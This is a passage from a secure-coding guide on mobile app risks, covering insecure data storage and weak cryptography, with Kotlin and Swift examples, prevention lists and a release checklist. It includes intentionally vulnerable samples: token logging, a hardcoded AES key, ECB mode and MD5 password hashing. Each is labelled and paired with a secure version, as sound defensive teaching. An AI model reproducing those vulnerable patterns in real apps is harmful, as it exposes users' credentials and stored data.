        Log.d("Auth", "Token: $token") // Visible in logcat
    }
}
```

### Secure Pattern -- Kotlin (Android)

```kotlin
// SECURE: Encrypted storage, no sensitive data in logs
class SecureDataManager(private val context: Context) {

    private val masterKey = MasterKey.Builder(context)
        .setKeyScheme(MasterKey.KeyScheme.AES256_GCM)
        .build()

    private val encryptedPrefs = EncryptedSharedPreferences.create(
        context,
        "secure_prefs",
        masterKey,
        EncryptedSharedPreferences.PrefKeyEncryptionScheme.AES256_SIV,
        EncryptedSharedPreferences.PrefValueEncryptionScheme.AES256_GCM,
    )

    fun saveToken(token: String) {
        encryptedPrefs.edit().putString("auth_token", token).apply()
    }

    fun getToken(): String? {
        return encryptedPrefs.getString("auth_token", null)
    }

    fun saveSensitiveFile(filename: String, data: ByteArray) {
        val encryptedFile = EncryptedFile.Builder(
            context,
            File(context.filesDir, filename), // Internal storage only
            masterKey,
            EncryptedFile.FileEncryptionScheme.AES256_GCM_HKDF_4KB,
        ).build()

        encryptedFile.openFileOutput().use { it.write(data) }
    }
}

// Configure ProGuard to strip Log calls in release builds
// -assumenosideeffects class android.util.Log {
//     public static int d(...);
//     public static int v(...);
// }
```

### Secure Pattern -- Swift (iOS)

```swift
// SECURE: Keychain for secrets, encrypted Core Data
import Security

class SecureStorageManager {

    // Store sensitive values in Keychain
    func storeInKeychain(key: String, value: String) throws {
        guard let data = value.data(using: .utf8) else { return }

        let query: [String: Any] = [
            kSecClass as String: kSecClassGenericPassword,
            kSecAttrAccount as String: key,
            kSecValueData as String: data,
            kSecAttrAccessible as String: kSecAttrAccessibleWhenUnlockedThisDeviceOnly,
        ]

        SecItemDelete(query as CFDictionary)
        let status = SecItemAdd(query as CFDictionary, nil)
        if status != errSecSuccess {
            throw StorageError.keychainError(status)
        }
    }

    // Use Data Protection for files
    func writeProtectedFile(filename: String, data: Data) throws {
        let url = getDocumentsDirectory().appendingPathComponent(filename)
        try data.write(to: url, options: [.completeFileProtection])

        // Exclude from backups
        var resourceValues = URLResourceValues()
        resourceValues.isExcludedFromBackup = true
        var mutableUrl = url
        try mutableUrl.setResourceValues(resourceValues)
    }
}
```

### Prevention

- [ ] Use platform-provided encrypted storage (EncryptedSharedPreferences, Keychain)
- [ ] Never store sensitive data on external storage
- [ ] Never log sensitive data (tokens, credentials, PII)
- [ ] Use file-level encryption for sensitive files
- [ ] Exclude sensitive files from device backups
- [ ] Clear sensitive data from memory when no longer needed
- [ ] Use SQLCipher for encrypted databases
- [ ] Disable clipboard for sensitive input fields

---

## M10: Insufficient Cryptography

### Description

Insufficient Cryptography covers the use of weak or deprecated cryptographic algorithms, improper key generation, insecure key storage, and custom cryptographic implementations in mobile applications. Mobile platforms provide strong cryptographic APIs, but developers frequently misuse them.

### Attack Scenario

A messaging app implements "encryption" using a simple XOR cipher with a hardcoded key. An attacker extracts the key from the binary and decrypts all stored messages. The app also uses MD5 to hash passwords locally before sending them to the server, allowing rainbow table attacks.

### Vulnerable Pattern -- Kotlin (Android)

```kotlin
// VULNERABLE: Weak crypto, hardcoded key, ECB mode
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

class InsecureCrypto {
    private val key = "1234567890123456" // Hardcoded key

    fun encrypt(data: String): ByteArray {
        val keySpec = SecretKeySpec(key.toByteArray(), "AES")
        val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding") // ECB mode leaks patterns
        cipher.init(Cipher.ENCRYPT_MODE, keySpec)
        return cipher.doFinal(data.toByteArray())
    }

    fun hashPassword(password: String): String {
        val md = java.security.MessageDigest.getInstance("MD5") // Weak hash
        return md.digest(password.toByteArray()).joinToString("") { "%02x".format(it) }
    }
}
```

### Secure Pattern -- Kotlin (Android)

```kotlin
// SECURE: AES-256-GCM, AndroidKeyStore, proper key management
import android.security.keystore.KeyGenParameterSpec
import android.security.keystore.KeyProperties
import javax.crypto.Cipher
import javax.crypto.KeyGenerator
import javax.crypto.spec.GCMParameterSpec

class SecureCrypto {

    companion object {
        private const val KEY_ALIAS = "app_encryption_key"
        private const val ANDROID_KEYSTORE = "AndroidKeyStore"
        private const val GCM_TAG_LENGTH = 128
    }

    init {
        // Generate key in AndroidKeyStore if not exists
        val keyStore = java.security.KeyStore.getInstance(ANDROID_KEYSTORE)
        keyStore.load(null)
        if (!keyStore.containsAlias(KEY_ALIAS)) {
            val keyGenerator = KeyGenerator.getInstance(
                KeyProperties.KEY_ALGORITHM_AES, ANDROID_KEYSTORE
            )
            keyGenerator.init(
                KeyGenParameterSpec.Builder(
                    KEY_ALIAS,
                    KeyProperties.PURPOSE_ENCRYPT or KeyProperties.PURPOSE_DECRYPT
                )
                    .setBlockModes(KeyProperties.BLOCK_MODE_GCM)
                    .setEncryptionPaddings(KeyProperties.ENCRYPTION_PADDING_NONE)
                    .setKeySize(256)
                    .setUserAuthenticationRequired(false)
                    .build()
            )
            keyGenerator.generateKey()
        }
    }

    fun encrypt(plaintext: ByteArray): ByteArray {
        val keyStore = java.security.KeyStore.getInstance(ANDROID_KEYSTORE)
        keyStore.load(null)
        val key = keyStore.getKey(KEY_ALIAS, null)

        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.ENCRYPT_MODE, key)

        val iv = cipher.iv
        val ciphertext = cipher.doFinal(plaintext)

        // Prepend IV to ciphertext
        return iv + ciphertext
    }

    fun decrypt(data: ByteArray): ByteArray {
        val keyStore = java.security.KeyStore.getInstance(ANDROID_KEYSTORE)
        keyStore.load(null)
        val key = keyStore.getKey(KEY_ALIAS, null)

        val iv = data.copyOfRange(0, 12) // GCM IV is 12 bytes
        val ciphertext = data.copyOfRange(12, data.size)

        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.DECRYPT_MODE, key, GCMParameterSpec(GCM_TAG_LENGTH, iv))

        return cipher.doFinal(ciphertext)
    }
}
```

### Secure Pattern -- Swift (iOS)

```swift
// SECURE: CryptoKit with Secure Enclave
import CryptoKit

class SecureCryptoManager {

    // Symmetric encryption with CryptoKit
    func encrypt(data: Data, using key: SymmetricKey) throws -> Data {
        let sealedBox = try AES.GCM.seal(data, using: key)
        guard let combined = sealedBox.combined else {
            throw CryptoError.encryptionFailed
        }
        return combined
    }

    func decrypt(data: Data, using key: SymmetricKey) throws -> Data {
        let sealedBox = try AES.GCM.SealedBox(combined: data)
        return try AES.GCM.open(sealedBox, using: key)
    }

    // Key generation
    func generateKey() -> SymmetricKey {
        return SymmetricKey(size: .bits256)
    }

    // Hashing
    func hashData(_ data: Data) -> String {
        let digest = SHA256.hash(data: data)
        return digest.map { String(format: "%02x", $0) }.joined()
    }
}
```

### Prevention

- [ ] Use platform cryptographic APIs (AndroidKeyStore, iOS CryptoKit/Keychain)
- [ ] Use AES-256-GCM for symmetric encryption (never ECB mode)
- [ ] Generate encryption keys in hardware-backed keystores
- [ ] Never hardcode cryptographic keys in source code
- [ ] Use strong hashing algorithms (SHA-256+, Argon2id for passwords)
- [ ] Use unique IVs/nonces for every encryption operation
- [ ] Never implement custom cryptographic algorithms
- [ ] Regularly review and update cryptographic implementations

---

## Summary Table

| Rank | Category                              | Severity | Primary Platform Risk                          |
| ---- | ------------------------------------- | -------- | ---------------------------------------------- |
| M1   | Improper Credential Usage             | Critical | Credential extraction from binaries            |
| M2   | Inadequate Supply Chain Security      | High     | Malicious SDKs, compromised dependencies        |
| M3   | Insecure Authentication/Authorization | Critical | Account takeover, privilege escalation          |
| M4   | Insufficient Input/Output Validation  | High     | WebView XSS, deep link injection               |
| M5   | Insecure Communication                | High     | MITM attacks on public networks                 |
| M6   | Inadequate Privacy Controls           | High     | Regulatory non-compliance, data harvesting      |
| M7   | Insufficient Binary Protections       | Medium   | Reverse engineering, piracy, exploit creation   |
| M8   | Security Misconfiguration             | Medium   | Debug exposure, data backup leakage             |
| M9   | Insecure Data Storage                 | High     | Local data theft, credential exposure           |
| M10  | Insufficient Cryptography             | High     | Data decryption by attacker                     |

---

## Best Practices for Mobile Application Security

### Development Phase

1. Use platform-secure storage for all credentials and sensitive data.
2. Implement certificate pinning for all backend connections.
3. Validate all input from deep links, intents, and IPC mechanisms.
4. Use platform cryptographic APIs instead of custom implementations.
5. Audit all third-party SDKs for privacy and security before integration.

### Build and Release Phase

1. Enable code obfuscation and minification for release builds.
2. Remove debug logging and settings from production builds.
3. Run static analysis and dependency scanning in CI/CD.
4. Verify that debuggable is false and backup is disabled.
5. Sign apps with proper code-signing certificates.

### Runtime Protection

1. Implement tamper detection and integrity verification.
2. Detect rooted/jailbroken devices and adjust security posture.
3. Implement session timeouts and re-authentication for sensitive actions.
4. Use biometric authentication for high-value operations.
5. Monitor for anomalous usage patterns.

---

## Enforcement Checklist

### Per-Release Verification

- [ ] No hardcoded credentials or API keys in the codebase (M1)
- [ ] All dependencies pinned and audited, SBOM generated (M2)
- [ ] Server-side authorization enforced on all endpoints (M3)
- [ ] All deep links and IPC inputs validated (M4)
- [ ] Certificate pinning enabled, cleartext traffic disabled (M5)
- [ ] Privacy manifest/data safety section accurate and complete (M6)
- [ ] Code obfuscation enabled, tamper detection active (M7)
- [ ] Production manifest settings hardened (M8)
- [ ] All sensitive data in encrypted storage (M9)
- [ ] Cryptographic implementation uses platform APIs with strong algorithms (M10)

### Testing Requirements

- [ ] SAST scan completed with no critical findings
- [ ] DAST/IAST scan completed
- [ ] Manual penetration testing for high-risk features
- [ ] Proxy interception test to verify pinning
- [ ] Decompilation test to verify obfuscation
- [ ] Privacy compliance review completed
